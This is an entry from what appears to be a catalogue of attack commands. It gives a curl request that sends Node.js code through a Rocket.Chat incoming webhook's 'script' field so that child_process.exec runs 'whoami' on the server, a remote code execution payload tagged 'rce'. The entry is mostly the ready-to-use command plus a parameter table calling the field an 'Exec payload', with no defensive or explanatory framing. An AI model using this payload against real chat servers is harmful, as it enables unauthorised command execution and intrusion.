---
id: cmd-curl-whoami-trigger
data: >-
  curl -X POST 'http://target:3000/hooks/webhook_id_here' -H 'Content-Type:
  application/json' -d
  '{"text":"ignore","script":"require(\"child_process\").exec(\"whoami\",
  {stdio: \"pipe\"}, (err, stdout) => {console.log(stdout.toString())})"}'
tags:
  - rce
  - trigger
type: command
output: rocketchat
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.856Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-webhook-whoami

## Command

```bash
curl -X POST 'http://target:3000/hooks/webhook_id_here' -H 'Content-Type: application/json' -d '{"text":"ignore","script":"require(\"child_process\").exec(\"whoami\", {stdio: \"pipe\"}, (err, stdout) => {console.log(stdout.toString())})"}'
```

## Description

Triggers the webhook to execute whoami.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| script | Exec payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST ... (as above)
```

## Expected Output

Response with "rocketchat"

## Related

- [[commands/curl-trigger-webhook-id]]
